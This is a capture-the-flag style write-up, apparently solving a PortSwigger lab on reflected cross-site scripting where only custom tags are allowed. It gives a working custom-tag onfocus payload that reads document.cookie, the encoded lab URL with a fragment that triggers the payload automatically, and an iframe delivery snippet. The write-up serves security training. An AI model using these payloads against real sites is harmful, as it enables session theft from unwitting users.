![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/014e693c-80c3-44d5-ae48-786181134070)

### Solution

We need create a custom tag and automatically alerts document.cookie.

onfocusevent , tabindex and id will work with any costom tag.

will try to create the pay load,

```js
<portswigger tabindex="1"onfocus="alert(document.cookie)"id="a1">
```

<portswigger>: This is a made-up element, not a regular one like <div> or <p>.

tabindex="1": This makes it so when you press the "Tab" key to move around a webpage, this element is the first one to be highlighted.

onfocus="alert(document.cookie)": When you click or tab to this element, it shows a pop-up box.

id="a1": It's like a name for this element so that you can refer to it later in your code.

We will enter this payload in the web application

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/710ddae7-7fa0-4fc1-bbda-09a7e41bf674)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/b20afef8-3dbf-40c5-aabd-0079858dddba)

For triger the alert we need type the id in the url using #a1.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/db9b7140-dbfa-43d3-8d85-84d62e0b3a28)


the exploit is `https://0a1100ef04046d6780d853e30074009d.web-security-academy.net/?search=%3Cportswigger+tabindex%3D%221%22onfocus%3D%22alert(document.cookie)%22id%3D%22a1%22%3E#a1`

we need to send it inside iframe

Payload will be like

```js
<iframe src="exploit url"></iframe>
```

now we give payload at exploit server

```js
<iframe src=https://0a1100ef04046d6780d853e30074009d.web-security-academy.net/?search=%3Cportswigger+tabindex%3D%221%22onfocus%3D%22alert(document.cookie)%22id%3D%22a1%22%3E#a1></iframe>
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/400b7ede-db4f-44b3-85a9-66434200a890)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/403bbf3d-dc70-40c8-99d6-393357a314bb)

now we send the exploit
